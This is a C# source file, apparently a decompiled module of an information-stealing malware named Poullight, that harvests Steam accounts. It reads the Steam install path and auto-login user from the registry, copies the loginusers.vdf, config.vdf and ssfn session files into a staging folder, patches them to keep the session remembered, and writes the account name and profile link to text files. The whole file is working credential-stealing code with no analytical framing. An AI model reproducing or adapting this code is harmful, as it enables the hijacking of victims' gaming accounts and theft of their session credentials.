using Microsoft.Win32;
using Poullight.Properties;
using System.IO;
using System.Text;

internal class Steam
{
	protected static void err()
	{
		File.WriteAllText($"{Buffer.path_l}\\Steam\\info.txt", $"{Buffer.head}Steam не найден на компьютере. (Или невозможно войти в аккаунт)");
		Buffer.XBufferData[6] = "0";
	}

	protected static void cfgfix(string login, string config, string username)
	{
		if (File.Exists(login) && File.Exists(config))
		{
			try
			{
				string contents = File.ReadAllText(login, Encoding.GetEncoding("Windows-1251")).Replace("\"RememberPassword\"\t\t\"0\"", "\"RememberPassword\"\t\t\"1\"").Replace("\"mostrecent\"\t\t\"0\"", "\"mostrecent\"\t\t\"1\"");
				string data = File.ReadAllText(config, Encoding.GetEncoding(1251));
				try
				{
					if (File.Exists(login))
					{
						File.Delete(login);
					}
				}
				catch
				{
				}
				try
				{
					if (File.Exists(config))
					{
						File.Delete(config);
					}
				}
				catch
				{
				}
				string newValue = Exporter.Export("\"MTBF\"\t\t\"", "\"", data);
				string text = "\"Accounts\"" + Exporter.Export("\"Accounts\"", "\t\t\t\t\t}\n\t\t\t\t}", data) + "\t\t\t\t\t}\n\t\t\t\t}";
				string newValue2 = "\"ConnectCache\"" + Exporter.Export("\"ConnectCache\"", "\t\t\t\t}", data) + "\t\t\t\t}";
				File.WriteAllText(login, contents, Encoding.GetEncoding(1251));
				File.WriteAllText(config, Encoding.UTF8.GetString(Resources.SteamCfg).Replace("{$MTBF}", newValue).Replace("{$Accounts}", text)
					.Replace("{$ConnectCache}", newValue2), Encoding.GetEncoding("Windows-1251"));
				File.WriteAllText($"{Buffer.path_l}Steam\\Ссылка на аккаунт.txt", "https://steamcommunity.com/profiles/" + Exporter.Export("\"SteamID\"\t\t\"", "\"", Exporter.Export(username, "}", text)).Replace("\"", ""), Encoding.GetEncoding(1251));
			}
			catch
			{
			}
		}
	}

	public static bool Start()
	{
		string text = $"{Buffer.path_l}Steam";
		string text2 = null;
		RegistryKey registryKey = null;
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		try
		{
			registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
			text2 = registryKey.GetValue("SteamPath").ToString().Replace("/", "\\");
		}
		catch
		{
			err();
			return false;
		}
		if (!string.IsNullOrEmpty(text2) && registryKey != null && Directory.Exists(text2))
		{
			string text3 = null;
			if (string.IsNullOrEmpty(registryKey.GetValue("AutoLoginUser").ToString()))
			{
				err();
				return false;
			}
			text3 = registryKey.GetValue("AutoLoginUser").ToString();
			if (Directory.Exists(text2 + "/config"))
			{
				string text4 = null;
				string[] files = Directory.GetFiles(text2 + "/config", "*.vdf");
				string[] files2 = Directory.GetFiles(text2, "ssfn*");
				if (files.Length != 0)
				{
					string[] array = files;
					foreach (string text5 in array)
					{
						try
						{
							text4 = Path.GetFileName(text5);
							if (text4.ToLower() == "loginusers.vdf" || text4.ToLower() == "config.vdf")
							{
								File.Copy(text5, text + "/" + text4, overwrite: true);
							}
						}
						catch
						{
						}
					}
					if (files2.Length != 0)
					{
						array = files2;
						foreach (string text6 in array)
						{
							try
							{
								text4 = Path.GetFileName(text6);
								File.SetAttributes(text6, FileAttributes.Normal);
								File.Copy(text6, text + "/" + text4, overwrite: true);
							}
							catch
							{
							}
						}
						try
						{
							cfgfix(text + "/loginusers.vdf", text + "/config.vdf", text3);
						}
						catch
						{
						}
						File.WriteAllText(text + "/AccountLogin.TXT", text3);
					}
					Buffer.XBufferData[6] = "1";
					return true;
				}
			}
		}
		err();
		return false;
	}
}
